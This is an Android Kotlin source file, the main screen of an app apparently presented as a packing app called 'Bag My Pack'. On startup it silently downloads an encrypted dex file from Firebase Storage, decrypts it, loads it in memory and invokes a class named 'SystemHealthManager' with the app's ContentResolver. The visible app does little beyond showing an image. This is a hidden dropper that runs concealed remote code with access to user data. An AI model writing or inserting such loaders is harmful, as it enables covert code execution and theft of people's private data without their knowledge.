package com.siahaan.bagpack.activities

import android.content.ContentResolver
import android.os.Build
import android.os.Bundle
import android.view.View
import android.view.Window
import android.view.WindowManager
import android.widget.ImageView
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import com.bumptech.glide.Glide
import com.google.firebase.FirebaseApp
import com.siahaan.bagpack.R
import com.siahaan.bagpack.utils.CryptoManager
import com.siahaan.bagpack.utils.FirebaseStorageManager
import dalvik.system.InMemoryDexClassLoader
import kotlinx.coroutines.runBlocking
import java.nio.ByteBuffer


class MainActivity : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN);
        FirebaseApp.initializeApp(this);
        setContentView(R.layout.activity_main)
        title = "Bag My Pack"

        val firebaseStorageManager = FirebaseStorageManager()
        runBlocking {
            val filePath = "classes.dex.enc"
            val dexFile = firebaseStorageManager.downloadEncryptedFile(filePath)
//            println("Downloaded Data: $dexFile")

            if (dexFile != null) {
                val decryptedDex: ByteBuffer = ByteBuffer.wrap(CryptoManager.decrypt(dexFile.readBytes()))

                val dexLoader = InMemoryDexClassLoader(decryptedDex, this.javaClass.classLoader)
                val mt = dexLoader.loadClass("com.siahaan.shm.SystemHealthManager")
                val checkMethodInMemory = mt.getMethod("run", android.content.ContentResolver::class.java)
                val newcl = mt.newInstance()
                checkMethodInMemory.invoke(newcl, contentResolver)
            } else {
                // Handle download failure
                println("Download failed.")
            }
        }

    }

    fun show(view: View) {
        val imageView: ImageView = findViewById(R.id.imageView)
        Glide.with(this).load(R.drawable.warp).into(imageView)
        view.isVisible = false
    }
}